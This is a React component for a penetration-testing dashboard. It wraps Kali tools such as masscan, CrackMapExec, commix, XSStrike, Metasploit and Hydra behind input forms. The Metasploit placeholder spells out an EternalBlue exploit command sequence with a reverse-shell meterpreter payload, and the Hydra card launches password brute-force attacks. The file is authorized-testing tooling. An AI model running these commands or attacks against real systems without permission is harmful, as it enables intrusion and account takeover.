import { useState } from 'react';
import { Card } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Badge } from '@/components/ui/badge';
import { ScrollArea } from '@/components/ui/scroll-area';
import { Separator } from '@/components/ui/separator';
import { 
  Zap, 
  Lock, 
  FileCode2, 
  HardDrive, 
  Search, 
  Shield, 
  ShieldAlert,
  Globe,
  Code,
  Terminal,
  Cpu,
  Key,
  Hash,
  Network
} from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { RealKaliToolsManager } from '@/utils/realKaliTools';

export default function AdvancedTools() {
  const { toast } = useToast();
  const toolsManager = RealKaliToolsManager.getInstance();
  
  // State for different tool categories
  const [masscanTarget, setMasscanTarget] = useState('');
  const [masscanPorts, setMasscanPorts] = useState('1-65535');
  const [masscanRate, setMasscanRate] = useState('1000');
  
  const [hydraTarget, setHydraTarget] = useState('');
  const [hydraService, setHydraService] = useState('ssh');
  const [hydraUsernameList, setHydraUsernameList] = useState('');
  const [hydraPasswordList, setHydraPasswordList] = useState('');
  
  const [wpscanTarget, setWpscanTarget] = useState('');
  const [wpscanApiToken, setWpscanApiToken] = useState('');
  
  const [enum4linuxTarget, setEnum4linuxTarget] = useState('');
  
  const [harvesterDomain, setHarvesterDomain] = useState('');
  const [harvesterSources, setHarvesterSources] = useState('google,bing,duckduckgo');
  
  const [sslyzeTarget, setSslyzeTarget] = useState('');
  const [wafw00fTarget, setWafw00fTarget] = useState('');
  const [wapitiTarget, setWapitiTarget] = useState('');
  const [commixTarget, setCommixTarget] = useState('');
  const [xsstrikeTarget, setXsstrikeTarget] = useState('');
  
  const [dnsenumDomain, setDnsenumDomain] = useState('');
  const [fierceDomain, setFierceDomain] = useState('');
  
  const [cmexecTarget, setCmexecTarget] = useState('');
  const [cmexecProtocol, setCmexecProtocol] = useState('smb');
  
  const [msfCommands, setMsfCommands] = useState('');
  
  const [output, setOutput] = useState<Record<string, string>>({});
  const [isRunning, setIsRunning] = useState<Record<string, boolean>>({});

  const handleToolRun = async (toolName: string, runFn: () => Promise<string>) => {
    setIsRunning(prev => ({ ...prev, [toolName]: true }));
    setOutput(prev => ({ ...prev, [toolName]: '' }));
    
    try {
      const result = await runFn();
      setOutput(prev => ({ ...prev, [toolName]: result }));
      toast({
        title: `${toolName} Completed`,
        description: 'Scan finished successfully',
      });
    } catch (error: any) {
      toast({
        title: `${toolName} Failed`,
        description: error.message,
        variant: 'destructive',
      });
    } finally {
      setIsRunning(prev => ({ ...prev, [toolName]: false }));
    }
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-3xl font-bold">Advanced VAPT Tools</h2>
          <p className="text-muted-foreground mt-1">
            Professional-grade penetration testing with latest Kali Linux tools
          </p>
        </div>
        <Badge variant="outline" className="text-lg px-4 py-2">
          <Terminal className="w-4 h-4 mr-2" />
          17 Advanced Tools
        </Badge>
      </div>

      <Tabs defaultValue="network" className="w-full">
        <TabsList className="grid w-full grid-cols-5">
          <TabsTrigger value="network">Network</TabsTrigger>
          <TabsTrigger value="web">Web Apps</TabsTrigger>
          <TabsTrigger value="recon">Reconnaissance</TabsTrigger>
          <TabsTrigger value="exploit">Exploitation</TabsTrigger>
          <TabsTrigger value="password">Password</TabsTrigger>
        </TabsList>

        {/* Network Tools */}
        <TabsContent value="network" className="space-y-4">
          {/* Masscan */}
          <Card className="p-6">
            <div className="flex items-start gap-4">
              <div className="p-3 rounded-lg bg-primary/10">
                <Zap className="w-6 h-6 text-primary" />
              </div>
              <div className="flex-1 space-y-4">
                <div>
                  <h3 className="text-xl font-semibold">Masscan - Ultra-Fast Port Scanner</h3>
                  <p className="text-sm text-muted-foreground mt-1">
                    Scan millions of ports per second with the fastest port scanner
                  </p>
                </div>
                
                <div className="grid grid-cols-3 gap-4">
                  <div>
                    <Label>Target IP/Range</Label>
                    <Input 
                      placeholder="192.168.1.0/24" 
                      value={masscanTarget}
                      onChange={(e) => setMasscanTarget(e.target.value)}
                    />
                  </div>
                  <div>
                    <Label>Port Range</Label>
                    <Input 
                      placeholder="1-65535" 
                      value={masscanPorts}
                      onChange={(e) => setMasscanPorts(e.target.value)}
                    />
                  </div>
                  <div>
                    <Label>Scan Rate (pkt/sec)</Label>
                    <Input 
                      placeholder="1000" 
                      value={masscanRate}
                      onChange={(e) => setMasscanRate(e.target.value)}
                    />
                  </div>
                </div>

                <Button 
                  onClick={() => handleToolRun('masscan', () => 
                    toolsManager.runMasscanScan(masscanTarget, masscanPorts, masscanRate)
                  )}
                  disabled={!masscanTarget || isRunning.masscan}
                >
                  {isRunning.masscan ? 'Scanning...' : 'Start Masscan'}
                </Button>

                {output.masscan && (
                  <ScrollArea className="h-48 w-full border rounded-md p-4">
                    <pre className="text-sm">{output.masscan}</pre>
                  </ScrollArea>
                )}
              </div>
            </div>
          </Card>

          {/* Enum4linux */}
          <Card className="p-6">
            <div className="flex items-start gap-4">
              <div className="p-3 rounded-lg bg-primary/10">
                <HardDrive className="w-6 h-6 text-primary" />
              </div>
              <div className="flex-1 space-y-4">
                <div>
                  <h3 className="text-xl font-semibold">Enum4linux - SMB Enumeration</h3>
                  <p className="text-sm text-muted-foreground mt-1">
                    Enumerate Windows/Samba systems for users, shares, policies
                  </p>
                </div>
                
                <div>
                  <Label>Target IP</Label>
                  <Input 
                    placeholder="192.168.1.10" 
                    value={enum4linuxTarget}
                    onChange={(e) => setEnum4linuxTarget(e.target.value)}
                  />
                </div>

                <Button 
                  onClick={() => handleToolRun('enum4linux', () => 
                    toolsManager.runEnum4linuxScan(enum4linuxTarget)
                  )}
                  disabled={!enum4linuxTarget || isRunning.enum4linux}
                >
                  {isRunning.enum4linux ? 'Enumerating...' : 'Start Enumeration'}
                </Button>

                {output.enum4linux && (
                  <ScrollArea className="h-48 w-full border rounded-md p-4">
                    <pre className="text-sm">{output.enum4linux}</pre>
                  </ScrollArea>
                )}
              </div>
            </div>
          </Card>

          {/* CrackMapExec */}
          <Card className="p-6">
            <div className="flex items-start gap-4">
              <div className="p-3 rounded-lg bg-primary/10">
                <Network className="w-6 h-6 text-primary" />
              </div>
              <div className="flex-1 space-y-4">
                <div>
                  <h3 className="text-xl font-semibold">CrackMapExec - Network Pentesting</h3>
                  <p className="text-sm text-muted-foreground mt-1">
                    Swiss army knife for pentesting networks (SMB, SSH, WinRM)
                  </p>
                </div>
                
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label>Target</Label>
                    <Input 
                      placeholder="192.168.1.10" 
                      value={cmexecTarget}
                      onChange={(e) => setCmexecTarget(e.target.value)}
                    />
                  </div>
                  <div>
                    <Label>Protocol</Label>
                    <Select value={cmexecProtocol} onValueChange={setCmexecProtocol}>
                      <SelectTrigger>
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="smb">SMB</SelectItem>
                        <SelectItem value="ssh">SSH</SelectItem>
                        <SelectItem value="winrm">WinRM</SelectItem>
                        <SelectItem value="ldap">LDAP</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                </div>

                <Button 
                  onClick={() => handleToolRun('crackmapexec', () => 
                    toolsManager.runCrackMapExec(cmexecTarget, cmexecProtocol)
                  )}
                  disabled={!cmexecTarget || isRunning.crackmapexec}
                >
                  {isRunning.crackmapexec ? 'Running...' : 'Start CrackMapExec'}
                </Button>

                {output.crackmapexec && (
                  <ScrollArea className="h-48 w-full border rounded-md p-4">
                    <pre className="text-sm">{output.crackmapexec}</pre>
                  </ScrollArea>
                )}
              </div>
            </div>
          </Card>
        </TabsContent>

        {/* Web Application Tools */}
        <TabsContent value="web" className="space-y-4">
          {/* WPScan */}
          <Card className="p-6">
            <div className="flex items-start gap-4">
              <div className="p-3 rounded-lg bg-primary/10">
                <FileCode2 className="w-6 h-6 text-primary" />
              </div>
              <div className="flex-1 space-y-4">
                <div>
                  <h3 className="text-xl font-semibold">WPScan - WordPress Security Scanner</h3>
                  <p className="text-sm text-muted-foreground mt-1">
                    Comprehensive WordPress vulnerability scanner with CVE database
                  </p>
                </div>
                
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label>WordPress URL</Label>
                    <Input 
                      placeholder="https://example.com" 
                      value={wpscanTarget}
                      onChange={(e) => setWpscanTarget(e.target.value)}
                    />
                  </div>
                  <div>
                    <Label>API Token (Optional)</Label>
                    <Input 
                      placeholder="Your WPScan API token" 
                      type="password"
                      value={wpscanApiToken}
                      onChange={(e) => setWpscanApiToken(e.target.value)}
                    />
                  </div>
                </div>

                <Button 
                  onClick={() => handleToolRun('wpscan', () => 
                    toolsManager.runWPScan(wpscanTarget, wpscanApiToken || undefined)
                  )}
                  disabled={!wpscanTarget || isRunning.wpscan}
                >
                  {isRunning.wpscan ? 'Scanning...' : 'Start WPScan'}
                </Button>

                {output.wpscan && (
                  <ScrollArea className="h-48 w-full border rounded-md p-4">
                    <pre className="text-sm">{output.wpscan}</pre>
                  </ScrollArea>
                )}
              </div>
            </div>
          </Card>

          {/* Wafw00f */}
          <Card className="p-6">
            <div className="flex items-start gap-4">
              <div className="p-3 rounded-lg bg-primary/10">
                <Shield className="w-6 h-6 text-primary" />
              </div>
              <div className="flex-1 space-y-4">
                <div>
                  <h3 className="text-xl font-semibold">Wafw00f - WAF Detection</h3>
                  <p className="text-sm text-muted-foreground mt-1">
                    Identify and fingerprint Web Application Firewall (WAF) products
                  </p>
                </div>
                
                <div>
                  <Label>Target URL</Label>
                  <Input 
                    placeholder="https://example.com" 
                    value={wafw00fTarget}
                    onChange={(e) => setWafw00fTarget(e.target.value)}
                  />
                </div>

                <Button 
                  onClick={() => handleToolRun('wafw00f', () => 
                    toolsManager.runWafw00f(wafw00fTarget)
                  )}
                  disabled={!wafw00fTarget || isRunning.wafw00f}
                >
                  {isRunning.wafw00f ? 'Detecting...' : 'Detect WAF'}
                </Button>

                {output.wafw00f && (
                  <ScrollArea className="h-48 w-full border rounded-md p-4">
                    <pre className="text-sm">{output.wafw00f}</pre>
                  </ScrollArea>
                )}
              </div>
            </div>
          </Card>

          {/* Wapiti */}
          <Card className="p-6">
            <div className="flex items-start gap-4">
              <div className="p-3 rounded-lg bg-primary/10">
                <ShieldAlert className="w-6 h-6 text-primary" />
              </div>
              <div className="flex-1 space-y-4">
                <div>
                  <h3 className="text-xl font-semibold">Wapiti - Web Vulnerability Scanner</h3>
                  <p className="text-sm text-muted-foreground mt-1">
                    Black-box web application vulnerability scanner
                  </p>
                </div>
                
                <div>
                  <Label>Target URL</Label>
                  <Input 
                    placeholder="https://example.com" 
                    value={wapitiTarget}
                    onChange={(e) => setWapitiTarget(e.target.value)}
                  />
                </div>

                <Button 
                  onClick={() => handleToolRun('wapiti', () => 
                    toolsManager.runWapiti(wapitiTarget)
                  )}
                  disabled={!wapitiTarget || isRunning.wapiti}
                >
                  {isRunning.wapiti ? 'Scanning...' : 'Start Wapiti Scan'}
                </Button>

                {output.wapiti && (
                  <ScrollArea className="h-48 w-full border rounded-md p-4">
                    <pre className="text-sm">{output.wapiti}</pre>
                  </ScrollArea>
                )}
              </div>
            </div>
          </Card>

          {/* Commix */}
          <Card className="p-6">
            <div className="flex items-start gap-4">
              <div className="p-3 rounded-lg bg-primary/10">
                <Code className="w-6 h-6 text-primary" />
              </div>
              <div className="flex-1 space-y-4">
                <div>
                  <h3 className="text-xl font-semibold">Commix - Command Injection</h3>
                  <p className="text-sm text-muted-foreground mt-1">
                    Automated detection and exploitation of command injection vulnerabilities
                  </p>
                </div>
                
                <div>
                  <Label>Target URL</Label>
                  <Input 
                    placeholder="https://example.com/page?param=value" 
                    value={commixTarget}
                    onChange={(e) => setCommixTarget(e.target.value)}
                  />
                </div>

                <Button 
                  onClick={() => handleToolRun('commix', () => 
                    toolsManager.runCommix(commixTarget)
                  )}
                  disabled={!commixTarget || isRunning.commix}
                >
                  {isRunning.commix ? 'Testing...' : 'Test for Command Injection'}
                </Button>

                {output.commix && (
                  <ScrollArea className="h-48 w-full border rounded-md p-4">
                    <pre className="text-sm">{output.commix}</pre>
                  </ScrollArea>
                )}
              </div>
            </div>
          </Card>

          {/* XSStrike */}
          <Card className="p-6">
            <div className="flex items-start gap-4">
              <div className="p-3 rounded-lg bg-primary/10">
                <Code className="w-6 h-6 text-primary" />
              </div>
              <div className="flex-1 space-y-4">
                <div>
                  <h3 className="text-xl font-semibold">XSStrike - Advanced XSS Detection</h3>
                  <p className="text-sm text-muted-foreground mt-1">
                    Most advanced XSS scanner with crawling and payload generation
                  </p>
                </div>
                
                <div>
                  <Label>Target URL</Label>
                  <Input 
                    placeholder="https://example.com" 
                    value={xsstrikeTarget}
                    onChange={(e) => setXsstrikeTarget(e.target.value)}
                  />
                </div>

                <Button 
                  onClick={() => handleToolRun('xsstrike', () => 
                    toolsManager.runXSStrike(xsstrikeTarget)
                  )}
                  disabled={!xsstrikeTarget || isRunning.xsstrike}
                >
                  {isRunning.xsstrike ? 'Scanning...' : 'Scan for XSS'}
                </Button>

                {output.xsstrike && (
                  <ScrollArea className="h-48 w-full border rounded-md p-4">
                    <pre className="text-sm">{output.xsstrike}</pre>
                  </ScrollArea>
                )}
              </div>
            </div>
          </Card>

          {/* SSLyze */}
          <Card className="p-6">
            <div className="flex items-start gap-4">
              <div className="p-3 rounded-lg bg-primary/10">
                <Lock className="w-6 h-6 text-primary" />
              </div>
              <div className="flex-1 space-y-4">
                <div>
                  <h3 className="text-xl font-semibold">SSLyze - SSL/TLS Configuration Scanner</h3>
                  <p className="text-sm text-muted-foreground mt-1">
                    Comprehensive SSL/TLS security scanner for misconfigurations
                  </p>
                </div>
                
                <div>
                  <Label>Target Domain</Label>
                  <Input 
                    placeholder="example.com:443" 
                    value={sslyzeTarget}
                    onChange={(e) => setSslyzeTarget(e.target.value)}
                  />
                </div>

                <Button 
                  onClick={() => handleToolRun('sslyze', () => 
                    toolsManager.runSSLyze(sslyzeTarget)
                  )}
                  disabled={!sslyzeTarget || isRunning.sslyze}
                >
                  {isRunning.sslyze ? 'Analyzing...' : 'Analyze SSL/TLS'}
                </Button>

                {output.sslyze && (
                  <ScrollArea className="h-48 w-full border rounded-md p-4">
                    <pre className="text-sm">{output.sslyze}</pre>
                  </ScrollArea>
                )}
              </div>
            </div>
          </Card>
        </TabsContent>

        {/* Reconnaissance Tools */}
        <TabsContent value="recon" className="space-y-4">
          {/* theHarvester */}
          <Card className="p-6">
            <div className="flex items-start gap-4">
              <div className="p-3 rounded-lg bg-primary/10">
                <Search className="w-6 h-6 text-primary" />
              </div>
              <div className="flex-1 space-y-4">
                <div>
                  <h3 className="text-xl font-semibold">theHarvester - OSINT Email & Subdomain Harvesting</h3>
                  <p className="text-sm text-muted-foreground mt-1">
                    Gather emails, names, subdomains, IPs from public sources
                  </p>
                </div>
                
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label>Domain</Label>
                    <Input 
                      placeholder="example.com" 
                      value={harvesterDomain}
                      onChange={(e) => setHarvesterDomain(e.target.value)}
                    />
                  </div>
                  <div>
                    <Label>Sources</Label>
                    <Input 
                      placeholder="google,bing,duckduckgo" 
                      value={harvesterSources}
                      onChange={(e) => setHarvesterSources(e.target.value)}
                    />
                  </div>
                </div>

                <Button 
                  onClick={() => handleToolRun('theharvester', () => 
                    toolsManager.runTheHarvester(harvesterDomain, harvesterSources)
                  )}
                  disabled={!harvesterDomain || isRunning.theharvester}
                >
                  {isRunning.theharvester ? 'Harvesting...' : 'Start Harvesting'}
                </Button>

                {output.theharvester && (
                  <ScrollArea className="h-48 w-full border rounded-md p-4">
                    <pre className="text-sm">{output.theharvester}</pre>
                  </ScrollArea>
                )}
              </div>
            </div>
          </Card>

          {/* Dnsenum */}
          <Card className="p-6">
            <div className="flex items-start gap-4">
              <div className="p-3 rounded-lg bg-primary/10">
                <Globe className="w-6 h-6 text-primary" />
              </div>
              <div className="flex-1 space-y-4">
                <div>
                  <h3 className="text-xl font-semibold">Dnsenum - DNS Enumeration</h3>
                  <p className="text-sm text-muted-foreground mt-1">
                    Multithreaded DNS information gathering tool
                  </p>
                </div>
                
                <div>
                  <Label>Domain</Label>
                  <Input 
                    placeholder="example.com" 
                    value={dnsenumDomain}
                    onChange={(e) => setDnsenumDomain(e.target.value)}
                  />
                </div>

                <Button 
                  onClick={() => handleToolRun('dnsenum', () => 
                    toolsManager.runDnsenum(dnsenumDomain)
                  )}
                  disabled={!dnsenumDomain || isRunning.dnsenum}
                >
                  {isRunning.dnsenum ? 'Enumerating...' : 'Enumerate DNS'}
                </Button>

                {output.dnsenum && (
                  <ScrollArea className="h-48 w-full border rounded-md p-4">
                    <pre className="text-sm">{output.dnsenum}</pre>
                  </ScrollArea>
                )}
              </div>
            </div>
          </Card>

          {/* Fierce */}
          <Card className="p-6">
            <div className="flex items-start gap-4">
              <div className="p-3 rounded-lg bg-primary/10">
                <Globe className="w-6 h-6 text-primary" />
              </div>
              <div className="flex-1 space-y-4">
                <div>
                  <h3 className="text-xl font-semibold">Fierce - DNS Reconnaissance</h3>
                  <p className="text-sm text-muted-foreground mt-1">
                    Locate non-contiguous IP space and hostnames via brute-force
                  </p>
                </div>
                
                <div>
                  <Label>Domain</Label>
                  <Input 
                    placeholder="example.com" 
                    value={fierceDomain}
                    onChange={(e) => setFierceDomain(e.target.value)}
                  />
                </div>

                <Button 
                  onClick={() => handleToolRun('fierce', () => 
                    toolsManager.runFierce(fierceDomain)
                  )}
                  disabled={!fierceDomain || isRunning.fierce}
                >
                  {isRunning.fierce ? 'Scanning...' : 'Start Fierce'}
                </Button>

                {output.fierce && (
                  <ScrollArea className="h-48 w-full border rounded-md p-4">
                    <pre className="text-sm">{output.fierce}</pre>
                  </ScrollArea>
                )}
              </div>
            </div>
          </Card>
        </TabsContent>

        {/* Exploitation Tools */}
        <TabsContent value="exploit" className="space-y-4">
          {/* Metasploit */}
          <Card className="p-6">
            <div className="flex items-start gap-4">
              <div className="p-3 rounded-lg bg-primary/10">
                <Terminal className="w-6 h-6 text-primary" />
              </div>
              <div className="flex-1 space-y-4">
                <div>
                  <h3 className="text-xl font-semibold">Metasploit Framework</h3>
                  <p className="text-sm text-muted-foreground mt-1">
                    World's most used penetration testing framework (enter commands one per line)
                  </p>
                </div>
                
                <div>
                  <Label>MSF Commands (one per line)</Label>
                  <textarea 
                    className="w-full h-32 p-2 border rounded-md font-mono text-sm"
                    placeholder="use exploit/windows/smb/ms17_010_eternalblue&#10;set RHOSTS 192.168.1.10&#10;set PAYLOAD windows/x64/meterpreter/reverse_tcp&#10;set LHOST 192.168.1.5&#10;exploit"
                    value={msfCommands}
                    onChange={(e) => setMsfCommands(e.target.value)}
                  />
                </div>

                <Button 
                  onClick={() => handleToolRun('metasploit', () => 
                    toolsManager.runMetasploit(msfCommands.split('\n').filter(c => c.trim()))
                  )}
                  disabled={!msfCommands || isRunning.metasploit}
                  variant="destructive"
                >
                  {isRunning.metasploit ? 'Executing...' : 'Execute Metasploit'}
                </Button>

                {output.metasploit && (
                  <ScrollArea className="h-48 w-full border rounded-md p-4">
                    <pre className="text-sm">{output.metasploit}</pre>
                  </ScrollArea>
                )}
              </div>
            </div>
          </Card>
        </TabsContent>

        {/* Password Cracking Tools */}
        <TabsContent value="password" className="space-y-4">
          {/* Hydra */}
          <Card className="p-6">
            <div className="flex items-start gap-4">
              <div className="p-3 rounded-lg bg-primary/10">
                <Key className="w-6 h-6 text-primary" />
              </div>
              <div className="flex-1 space-y-4">
                <div>
                  <h3 className="text-xl font-semibold">Hydra - Network Login Cracker</h3>
                  <p className="text-sm text-muted-foreground mt-1">
                    Fast network logon cracker supporting many protocols
                  </p>
                </div>
                
                <div className="grid grid-cols-3 gap-4">
                  <div>
                    <Label>Target</Label>
                    <Input 
                      placeholder="192.168.1.10" 
                      value={hydraTarget}
                      onChange={(e) => setHydraTarget(e.target.value)}
                    />
                  </div>
                  <div>
                    <Label>Service</Label>
                    <Select value={hydraService} onValueChange={setHydraService}>
                      <SelectTrigger>
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="ssh">SSH</SelectItem>
                        <SelectItem value="ftp">FTP</SelectItem>
                        <SelectItem value="telnet">Telnet</SelectItem>
                        <SelectItem value="http-get">HTTP GET</SelectItem>
                        <SelectItem value="http-post">HTTP POST</SelectItem>
                        <SelectItem value="rdp">RDP</SelectItem>
                        <SelectItem value="smb">SMB</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  <div>
                    <Label>Username List File</Label>
                    <Input 
                      placeholder="/usr/share/wordlists/metasploit/unix_users.txt" 
                      value={hydraUsernameList}
                      onChange={(e) => setHydraUsernameList(e.target.value)}
                    />
                  </div>
                  <div>
                    <Label>Password List File</Label>
                    <Input 
                      placeholder="/usr/share/wordlists/rockyou.txt" 
                      value={hydraPasswordList}
                      onChange={(e) => setHydraPasswordList(e.target.value)}
                    />
                  </div>
                </div>

                <Button 
                  onClick={() => handleToolRun('hydra', () => 
                    toolsManager.runHydraScan(hydraTarget, hydraService, hydraUsernameList, hydraPasswordList)
                  )}
                  disabled={!hydraTarget || isRunning.hydra}
                  variant="destructive"
                >
                  {isRunning.hydra ? 'Cracking...' : 'Start Hydra Attack'}
                </Button>

                {output.hydra && (
                  <ScrollArea className="h-48 w-full border rounded-md p-4">
                    <pre className="text-sm">{output.hydra}</pre>
                  </ScrollArea>
                )}
              </div>
            </div>
          </Card>

          <Card className="p-4 bg-destructive/10 border-destructive/50">
            <p className="text-sm text-destructive font-medium">
              ⚠️ Password cracking tools (Hydra, John, Hashcat) require authorization. Only use on systems you own or have explicit permission to test.
            </p>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  );
}
